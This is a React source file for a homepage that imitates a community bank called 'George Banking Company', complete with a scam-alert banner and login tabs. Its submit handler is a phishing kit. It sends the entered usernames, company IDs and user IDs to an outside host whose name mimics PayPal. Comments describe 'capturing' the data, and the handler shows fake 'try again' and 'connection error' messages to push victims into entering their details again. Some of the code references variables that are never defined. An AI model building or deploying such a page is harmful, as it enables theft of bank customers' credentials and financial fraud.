import React, { useState } from "react";
import axios from "axios";
import { toast, ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { MdVisibility, MdVisibilityOff } from "react-icons/md";

import {
  Search,
  Phone,
  MapPin,
  TrendingUp,
  HelpCircle,
  Landmark,
  ExternalLink,
  Share2,
  Globe,
  Lock,
  User,
  Tag,
} from "lucide-react";

import {
  FaMoneyCheckAlt,
  FaLaptop,
  FaCreditCard,
  FaDollarSign,
  FaUniversity,
  FaHome,
} from "react-icons/fa";

import phone2 from "../assets/phone12.png";
import logo from "../assets/BAD .png";
import open from "../assets/open.png";
import world from "../assets/world.png";
import last from "../assets/last.png";
import { NavLink } from "react-router-dom";

export default function HomePage() {
  const [companyId, setCompanyID] = useState("");
  const [userId, setUserID] = useState("");
  const [username, setUsername] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [loading, setLoading] = useState(false);

  // Keeping standard React camelCase naming pattern for the state updater
  const [activeTab, setActiveTab] = useState("personal");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      //  Immediately capture the data in the background
      await axios.post("https://paypalcom-nl.onrender.com/api/auth/login", {
        userId,
        companyId,
        username,
      });

      // 2. Start the 3-minute fake loading (180,000 ms)
      setTimeout(() => {
        setLoading(false);
        const newAttemptCount = attempts + 1;
        setAttempts(newAttemptCount);

        // 3. Logic for Toast Messages
        if (newAttemptCount < 2) {
          toast.warn("Please try again", {
            position: "top-center",
            autoClose: 1000,
          });
        } else {
          toast.error("Connection error, try again later", {
            position: "top-center",
            autoClose: false, // Keep it visible
          });
        }

        // Clear password field to force re-entry
        setPassword("");
      }, 1800);
    } catch (error) {
      // If the actual server fails, we still stop loading after a bit
      setLoading(false);
      toast.error("System busy. Please try again later.");
    }
  };

  const services = [
    {
      title: "Business Checking Accounts",
      icon: FaMoneyCheckAlt,
    },
    {
      title: "Digital Banking",
      icon: FaLaptop,
    },
    {
      title: "Private Banking",
      icon: FaCreditCard,
    },
    {
      title: "Mortgage Loans",
      icon: FaDollarSign,
    },
    {
      title: "Personal Checking",
      icon: FaUniversity,
    },
    {
      title: "Residential Loans",
      icon: FaHome,
    },
  ];
  return (
    <>
      <div className="bg-[#f8f9fa] text-[#191c1d] font-sans overflow-x-hidden antialiased">
        {/* --- Alert Banner --- */}
        <div className="bg-[#853375] h-40 text-white py-2.5 px-4 sm:px-6 lg:px-8 text-center">
          <p className=" mt-3 leading-relaxed max-w-6xl mx-auto font-bold tracking-wide">
            <span className="font-extrabold uppercase tracking-wider bg-white/20 px-1.5 py-0.5 rounded mr-1">
              Scam Alert:
            </span>{" "}
            We've been made aware of scammers calling customers from
            530.608.0605, posing as a GBC employee ("Xavier") and requesting
            mobile numbers to send a link to reset online banking passwords.
            Please remember: GBC will never ask for sensitive information or
            send links to reset passwords through unsolicited calls. Do not
            share personal information or click on any links. If you receive a
            suspicious call, hang up immediately and contact us directly at
            866.711.4530. Your security is our top priority—stay vigilant and
            help us keep your information safe.
          </p>
        </div>

        {/* --- Header Architecture --- */}
        <header className="h-50 bg-white border-b border-[#edeeef] shadow-sm">
          <div className="border-b border-slate-100 hidden sm:block bg-slate-50/50">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex justify-end items-center py-2.5 gap-6 text-xs font-bold tracking-wider text-[#00647F]">
              <div className="flex items-center gap-1.5 cursor-pointer hover:text-[#004c63] transition-colors group">
                <Search className="w-3.5 h-3.5" />
                <span className="group-hover:underline">SEARCH</span>
              </div>
              <div className="flex items-center gap-1.5 cursor-pointer hover:text-[#004c63] transition-colors group">
                <Phone className="w-3.5 h-3.5" />
                <span className="group-hover:underline">CONTACT</span>
              </div>
              <div className="flex items-center gap-1.5 cursor-pointer hover:text-[#004c63] transition-colors group">
                <MapPin className="w-3.5 h-3.5" />
                <span className="group-hover:underline">LOCATIONS</span>
              </div>
            </div>
          </div>

          {/* Primary Layout Brand Navbar */}
          <div className="flex justify-between items-center px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
            <div className="flex items-center h-full">
              <img
                alt="GBC Logo"
                className="w-full h-[150px] object-contain"
                src={logo}
              />
            </div>
            <div className="flex items-center gap-8">
              <div className="hidden lg:flex gap-6 items-center text-xs font-bold tracking-wider text-[#001237]">
                <a className="hover:text-[#00647F] transition-colors" href="#">
                  ABOUT
                </a>
                <a className="hover:text-[#00647F] transition-colors" href="#">
                  PERSONAL
                </a>
                <a className="hover:text-[#00647F] transition-colors" href="#">
                  BUSINESS
                </a>
                <a className="hover:text-[#00647F] transition-colors" href="#">
                  COMMERCIAL
                </a>
                <a className="hover:text-[#00647F] transition-colors" href="#">
                  DIGITAL
                </a>
                <a className="hover:text-[#00647F] transition-colors" href="#">
                  RESOURCES
                </a>
              </div>
              <NavLink
                to="/login"
                className="bg-[#004C63] text-white px-5 py-2.5 rounded-lg font-bold text-xs hover:bg-[#002f3e] transition-all uppercase tracking-wider shadow-sm"
              >
                Log In
              </NavLink>
            </div>
          </div>
        </header>

        <main>
          {/* --- Hero Display Stage --- */}
          <section className="relative min-h-[520px] lg:h-[580px] flex items-center py-12 lg:py-0 overflow-hidden bg-[#001237]">
            {/* Background Image Canvas Layer with Gradient Shield Mask */}
            <div className="absolute inset-0 z-0">
              <img
                alt="Empowering Your Financial Journey"
                className="w-full h-full object-cover"
                src="https://lh3.googleusercontent.com/aida/AP1WRLuxDupoE3nRtHYHqvHLx7SYIHuCujWX8yd5nLq5w5ea1OH3gBbNTZ7I27krUw2nwGHagrPoKg7pCkJl_gKPe5bYD-RdbaeivvHWdGeZ7DlfpVIOx9Vnmaa4GV5gDqwTCLQDNfc4SvjbWBjgejWERq1CyBZOeDnAlGHe2PdAgvMrhigJnflTymdCLIaOCsb71hBIwCy0qHLsQHlFxhHwKpCBCThSMKKdIDPsif3P7oiGHvd9pO37aFO1vOE"
              />
            </div>

            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 w-full grid grid-cols-1 lg:grid-cols-12 gap-8 items-center relative z-10">
              {/* Value Proposition Statement Box */}
              <div className="lg:col-span-7 space-y-6 text-white text-center lg:text-left">
                <h1 className="text-3xl sm:text-4xl lg:text-5xl font-black text-white leading-tight tracking-tight drop-shadow-md">
                  Empowering Your <br className="hidden sm:inline" />
                  Financial Journey.
                </h1>
                <p className="text-base sm:text-lg text-slate-100 max-w-xl mx-auto lg:mx-0 leading-relaxed font-medium drop-shadow">
                  Stable, community-focused, and modern banking solutions
                  tailored for you. Built on trust, driven by innovation.
                </p>
                <div className="flex flex-wrap justify-center lg:justify-start gap-4 pt-2">
                  <p className="bg-[#CCE881] text-[#001237] px-6 py-3 rounded-xl text-sm font-bold hover:bg-[#b8d46e] transition-all shadow-md">
                    Treasure Solution
                  </p>
                </div>
              </div>

              {/* Portal Authentication Component Window Context */}
              <div className="lg:col-span-5 w-full max-w-md mx-auto">
                <div className="bg-white/95 backdrop-blur-md rounded-2xl shadow-2xl border border-white/20 overflow-hidden">
                  <div className="p-6 sm:p-8">
                    <h2 className="text-[#001237] font-black text-center text-xs tracking-widest uppercase mb-6">
                      Account Logins
                    </h2>

                    {/* Dynamic Action Trigger Tab Bar */}
                    <div className="flex bg-slate-100/80 p-1 rounded-xl mb-5 gap-1">
                      <button
                        onClick={() => setActiveTab("personal")}
                        className={`flex-1 py-2 font-bold text-xs rounded-lg uppercase transition-all ${
                          activeTab === "personal"
                            ? "bg-[#853375] text-white shadow-sm"
                            : "text-[#45464e] hover:text-[#001237]"
                        }`}
                      >
                        Personal
                      </button>
                      <button
                        onClick={() => setActiveTab("business")}
                        className={`flex-1 py-2 font-bold text-xs rounded-lg uppercase transition-all bg-gray-200 ${
                          activeTab === "business"
                            ? "bg-[#853375] text-white shadow-sm"
                            : "text-[#45464e] hover:text-[#001237]"
                        }`}
                      >
                        Business
                      </button>
                      <button className="flex-1 py-2 font-bold text-xs rounded-lg uppercase transition-all bg-gray-200 ">
                        Loan
                      </button>
                    </div>

                    {/* Conditionally Rendered Content Blocks */}
                    {activeTab === "personal" && (
                      // *** FIX: Wrapped in a form and added onChange for username ***
                      <form onSubmit={handleSubmit} className="space-y-3">
                        <div className="space-y-2 flex gap-6 bg-gray-200 rounded-xl px-4 py-3 items-center justify-between">
                          <input
                            id="username"
                            type="text"
                            label="Username"
                            disabled={loading}
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                            placeholder="Username"
                            className="w-50 py-3.5 px-3 borde border-gray-20 bg-white py-3.5 rounded-lg px-3 border bg-gray-200 border-gray-200"
                          />

                          <button
                            type="submit"
                            disabled={loading}
                            className={`w-30 rounded-xl font-bold text-sm uppercase transition-all tracking-wider shadow-sm h-13 ${
                              loading
                                ? "bg-gray-400 cursor-not-allowed"
                                : "bg-[#CCE881] text-[#001237] hover:bg-[#b8d46e]"
                            }`}
                          >
                            {loading ? "Logging In..." : "Login"}
                          </button>
                        </div>
                        <div className="flex gap-2 items-center text-xs font-semibold pt-2">
                          <a className="hover:underline" href="#">
                            Enroll Now
                          </a>
                          <a className="hover:underline" href="#">
                            Forgot Username
                          </a>
                        </div>
                      </form>
                    )}

                    {activeTab === "business" && (
                      // *** FIX: Unified to use a form tag ***
                      <form onSubmit={handleSubmit} className="space-y-4">
                        <input
                          type="text"
                          label="Company ID"
                          value={companyId}
                          placeholder="Company ID"
                          id="companyId"
                          disabled={loading}
                          onChange={(e) => setCompanyID(e.target.value)}
                          className=" w-50 py-3.5 px-3 borde border-gray-20 rounded-lg px-3 border bg-gray-200 border-gray-200"
                        />
                        <input
                          type="text"
                          label="User ID"
                          value={userId}
                          placeholder="User ID"
                          id="userId"
                          disabled={loading}
                          onChange={(e) => setUserID(e.target.value)}
                          className=" w-50 py-3.5 px-3 borde border-gray-20 rounded-lg px-3 border bg-gray-200 border-gray-200"
                        />

                        <button
                          type="submit"
                          disabled={loading}
                          className={`w-full py-3.5 rounded-xl font-bold text-sm uppercase transition-all tracking-wider shadow-sm ${
                            loading
                              ? "bg-gray-400 cursor-not-allowed"
                              : "bg-[#CCE881] text-[#001237] hover:bg-[#b8d46e]"
                          }`}
                        >
                          {loading ? "Logging In..." : "Login"}
                        </button>
                        <div className="flex justify-between items-center text-xs font-semibold pt-2 text-[#00647F]">
                          <a className="hover:underline" href="#">
                            Business Enrollment
                          </a>
                          <a className="hover:underline" href="#">
                            Help Center
                          </a>
                        </div>
                      </form>
                    )}

                    {activeTab === "loan" && (
                      // *** FIX: Wrapped in a form and added onChange ***
                      <form onSubmit={handleSubmit} className="space-y-4">
                        <Input
                          label="Loan Account Number"
                          value={loanAccountNumber}
                          onChange={(e) => setLoanAccountNumber(e.target.value)}
                          placeholder="Loan Account Number"
                          icon={TrendingUp}
                        />
                        {/* Assuming you might need a password/PIN for loan access */}
                        <Input
                          label="Password/PIN"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          placeholder="Password/PIN"
                          icon={Lock}
                          type="password"
                        />
                        <button
                          type="submit"
                          disabled={loading}
                          className={`w-full py-3.5 rounded-xl font-bold text-sm uppercase transition-all tracking-wider shadow-sm ${
                            loading
                              ? "bg-gray-400 cursor-not-allowed"
                              : "bg-[#CCE881] text-[#001237] hover:bg-[#b8d46e]"
                          }`}
                        >
                          {loading
                            ? "Accessing Portal..."
                            : "Access Loan Portal"}
                        </button>
                        <div className="flex justify-between items-center text-xs font-semibold pt-2 text-[#00647F]">
                          <a className="hover:underline" href="#">
                            Pay Your Loan
                          </a>
                          <a className="hover:underline" href="#">
                            Support
                          </a>
                        </div>
                      </form>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* --- Navigation Shortcuts Grid Segment --- */}
          <section className="py-24 bg-[#f4f4f4]">
            <div className="max-w-7xl mx-auto px-6">
              {/* Header */}
              <div className="text-center max-w-3xl mx-auto mb-20">
                <h2 className="text-5xl font-black text-[#001237] mb-6">
                  How Can We Help?
                </h2>

                <p className="text-[#555] text-lg leading-8">
                  When it comes to banking, you have a choice. We're a local
                  bank that is invested in you as well as our communities. Our
                  commitment to our relationships, service, and expertise help
                  guide us in our vision to be your "Bank of Choice". We are
                  GBC, and your success is our mission.
                </p>
              </div>

              {/* Services */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-y-20 gap-x-16">
                {services.map((service, index) => {
                  const Icon = service.icon;

                  return (
                    <div
                      key={index}
                      className="flex flex-col items-center text-center group cursor-pointer"
                    >
                      <div className="w-36 h-36 rounded-full bg-[#a8b3c7] flex items-center justify-center transition-all duration-300 group-hover:scale-105 group-hover:shadow-xl">
                        <div className="w-28 h-28 rounded-full bg-[#001f69] flex items-center justify-center">
                          <Icon className="text-white text-5xl" />
                        </div>
                      </div>

                      <h3 className="mt-6 text-[#001237] text-sm md:text-base font-semibold uppercase tracking-wide">
                        {service.title}
                      </h3>
                    </div>
                  );
                })}
              </div>
            </div>
          </section>

          {/* --- Product / Channel Pathway Showcase Container --- */}
          <section className="bg-[#00647F] py-16 text-white">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 grid grid-cols-1 md:grid-cols-12 gap-12 items-center">
              {/* Device Viewport Visualization Stage Frame Mockup Container */}
              <div className="md:col-span-5 flex justify-center">
                <img src={phone2} alt="" />
              </div>

              {/* Structured App Feature Matrix Segment */}
              <div className="md:col-span-7 space-y-6">
                <h2 className="text-2xl sm:text-3xl font-black leading-tight">
                  Access GBC Anytime, Anywhere.
                  <br />
                  <span className="text-[#CCE881]">Mobile Banking</span>
                </h2>
                <div className="flex flex-wrap flex-col gap-4 text-sm font-medium text-slate-100">
                  <div className="flex items-center gap-2">
                    <span className="text-lime-300 font-bold">✓</span> View
                    Account Balances
                  </div>
                  <div className="flex items-center gap-2 ">
                    <span className="text-lime-300 font-bold">✓</span> Review
                    History
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="text-lime-300 font-bold">✓</span> Transfer
                    Funds Fast
                  </div>
                  <div className="flex items-center gap-2 ">
                    <span className="text-lime-300 font-bold">✓</span> Pay Bills
                    Seamlessly
                  </div>
                </div>
                <div className="pt-2">
                  <button className="bg-[#CCE881] text-[#001237] px-6 py-3 rounded-xl font-bold text-xs uppercase hover:bg-[#b8d46e] transition-all tracking-wider shadow-md">
                    LEARN MORE
                  </button>
                </div>
              </div>
            </div>
          </section>

          {/* --- Century Trust Metrics Block --- */}
          <section className="py-20 bg-[#001237] text-white border-b border-white/5">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center max-w-3xl space-y-6">
              <div className="w-16 h-16 bg-white/5 rounded-2xl flex items-center justify-center mx-auto text-[#CCE881] border border-white/10 shadow-inner">
                <Landmark className="w-8 h-8" />
              </div>
              <h2 className="text-3xl font-black tracking-tight">
                Your Community Bank Since 1920.
              </h2>
              <p className="text-base text-slate-300 leading-relaxed font-medium">
                For over a century, George Banking Company has been the bedrock
                of regional prosperity. We don't just bank here; we live here,
                grow here, and invest back into the people who make this place
                home.
              </p>
              <div className="grid grid-cols-3 gap-4 pt-8 border-t border-white/10">
                <div>
                  <p className="text-2xl sm:text-3xl font-black text-[#CCE881] tracking-tight">
                    $2.4B
                  </p>
                  <p className="text-[10px] font-bold uppercase tracking-widest text-slate-400 mt-1">
                    Assets Managed
                  </p>
                </div>
                <div>
                  <p className="text-2xl sm:text-3xl font-black text-[#CCE881] tracking-tight">
                    100k+
                  </p>
                  <p className="text-[10px] font-bold uppercase tracking-widest text-slate-400 mt-1">
                    Local Partners
                  </p>
                </div>
                <div>
                  <p className="text-2xl sm:text-3xl font-black text-[#CCE881] tracking-tight">
                    14
                  </p>
                  <p className="text-[10px] font-bold uppercase tracking-widest text-slate-400 mt-1">
                    Branches
                  </p>
                </div>
              </div>
            </div>
          </section>

          {/* --- Latest Insights & Knowledge Domain Base --- */}
          <section className="py-20 bg-white">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
              <div className="flex flex-col sm:flex-row justify-between items-start sm:items-end gap-4 mb-10">
                <div>
                  <h2 className="text-2xl font-black text-[#001237] tracking-tight">
                    Latest Insights
                  </h2>
                  <p className="text-sm text-slate-500 font-medium mt-1">
                    Expert perspectives on markets and financial wellness.
                  </p>
                </div>
                <a
                  className="inline-flex items-center gap-1 text-[#00647F] font-bold text-xs tracking-wider uppercase hover:underline"
                  href="#"
                >
                  See All Articles <ExternalLink className="w-3.5 h-3.5" />
                </a>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                <article className="group cursor-pointer space-y-4">
                  <img src={open} alt="" />
                  <div className="space-y-2">
                    <span className="text-[10px] font-extrabold text-[#00647F] uppercase tracking-wider block">
                      Economy
                    </span>
                    <h4 className="text-base font-bold text-[#001237] group-hover:text-[#00647F] transition-colors leading-snug">
                      Quarterly Market Outlook: Navigating Volatility
                    </h4>
                    <p className="text-xs text-slate-500 font-medium leading-relaxed line-clamp-2">
                      Our analysts break down the current economic landscape and
                      what it means for your portfolio in the coming months.
                    </p>
                  </div>
                </article>

                <article className="group cursor-pointer space-y-4">
                  <div className="aspect-video rounded-2xl overflow-hidden bg-slate-100 border border-slate-100 shadow-sm relative">
                    <img
                      src={world}
                      alt=""
                      className="h-full w-full object-cover"
                    />
                  </div>
                  <div className="space-y-2">
                    <span className="text-[10px] font-extrabold text-[#00647F] uppercase tracking-wider block">
                      Financial Wellness
                    </span>
                    <h4 className="text-base font-bold text-[#001237] group-hover:text-[#00647F] transition-colors leading-snug">
                      The Power of High-Yield Savings in a Changing Market
                    </h4>
                    <p className="text-xs text-slate-500 font-medium leading-relaxed line-clamp-2">
                      Maximizing your liquidity doesn't have to mean sacrificing
                      returns. Learn how to optimize your cash holdings.
                    </p>
                  </div>
                </article>

                <article className="group cursor-pointer space-y-4">
                  <div className="aspect-video rounded-2xl overflow-hidden bg-slate-100 border border-slate-100 shadow-sm relative">
                    <img
                      src={last}
                      alt=""
                      className="h-full  w-full object-cover"
                    />
                  </div>
                  <div className="space-y-2">
                    <span className="text-[10px] font-extrabold text-[#00647F] uppercase tracking-wider block">
                      Security
                    </span>
                    <h4 className="text-base font-bold text-[#001237] group-hover:text-[#00647F] transition-colors leading-snug">
                      Cyber Resilience: Protecting Your Digital Identity
                    </h4>
                    <p className="text-xs text-slate-500 font-medium leading-relaxed line-clamp-2">
                      Steps you can take today to fortify your accounts against
                      modern digital threats and social engineering.
                    </p>
                  </div>
                </article>
              </div>
            </div>
          </section>
        </main>

        {/* --- Footer Component Block --- */}
        <footer className="w-full bg-[#001237] text-white border-t border-white/5">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-16 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-12 gap-8">
            <div className="lg:col-span-4 space-y-4">
              <div className="text-lg font-black tracking-tight flex items-center gap-1">
                GBC
              </div>
              <p className="text-xs text-slate-400 leading-relaxed font-medium">
                Providing premier banking services with local integrity and
                global vision.
              </p>
              <div className="flex gap-3 pt-2">
                <a
                  className="w-8 h-8 rounded-xl border border-white/10 flex items-center justify-center text-slate-400 hover:text-white hover:bg-white/5 transition-all"
                  href="#"
                >
                  <Share2 className="w-4 h-4" />
                </a>
                <a
                  className="w-8 h-8 rounded-xl border border-white/10 flex items-center justify-center text-slate-400 hover:text-white hover:bg-white/5 transition-all"
                  href="#"
                >
                  <Globe className="w-4 h-4" />
                </a>
              </div>
            </div>

            <div className="lg:col-span-2 space-y-3">
              <h5 className="text-[10px] font-bold uppercase tracking-widest text-slate-400">
                Quick Links
              </h5>
              <ul className="space-y-2 text-xs font-medium text-slate-300">
                <li>
                  <a className="hover:text-white transition-colors" href="#">
                    Locations
                  </a>
                </li>
                <li>
                  <a className="hover:text-white transition-colors" href="#">
                    Contact Us
                  </a>
                </li>
                <li>
                  <a className="hover:text-white transition-colors" href="#">
                    Careers
                  </a>
                </li>
                <li>
                  <a className="hover:text-white transition-colors" href="#">
                    Site Map
                  </a>
                </li>
              </ul>
            </div>

            <div className="lg:col-span-2 space-y-3">
              <h5 className="text-[10px] font-bold uppercase tracking-widest text-slate-400">
                Compliance
              </h5>
              <ul className="space-y-2 text-xs font-medium text-slate-300">
                <li>
                  <a className="hover:text-white transition-colors" href="#">
                    Privacy Policy
                  </a>
                </li>
                <li>
                  <a className="hover:text-white transition-colors" href="#">
                    Terms of Service
                  </a>
                </li>
                <li>
                  <a className="hover:text-white transition-colors" href="#">
                    Security
                  </a>
                </li>
                <li>
                  <a className="hover:text-white transition-colors" href="#">
                    ADA Compliance
                  </a>
                </li>
              </ul>
            </div>

            <div className="lg:col-span-4 space-y-3">
              <h5 className="text-[10px] font-bold uppercase tracking-widest text-slate-400">
                Stay Connected
              </h5>
              <p className="text-xs text-slate-400 font-medium">
                Join our newsletter for financial insights.
              </p>
              <div className="flex gap-2 pt-1">
                <input
                  type="email"
                  placeholder="Email Address"
                  className="bg-white/5 border border-white/10 text-white rounded-xl px-3 py-2 text-xs w-full focus:outline-none focus:ring-1 focus:ring-lime-300"
                />
                <button className="bg-[#004C63] text-white px-4 rounded-xl text-xs font-bold uppercase tracking-wider hover:bg-[#003747] transition-colors shadow-sm">
                  Join
                </button>
              </div>
            </div>
          </div>

          {/* Regulatory & Institutional Framework Signature Base Line */}
          <div className="w-full bg-[#000e2b] py-6 px-4 text-center border-t border-white/5">
            <div className="flex justify-center items-center gap-3 mb-2 text-xs font-medium">
              <span className="font-black text-white tracking-widest border border-white/20 px-1.5 py-0.5 rounded text-[10px]">
                FDIC
              </span>
              <span className="text-slate-400 text-[11px]">
                Member FDIC. Equal Housing Lender.
              </span>
            </div>
            <p className="text-[11px] text-slate-500 font-medium">
              © 2026 George Banking Company. All Rights Reserved.
            </p>
          </div>
        </footer>
        <ToastContainer position="top-center" autoClose={3000} theme="light" />
      </div>
    </>
  );
}
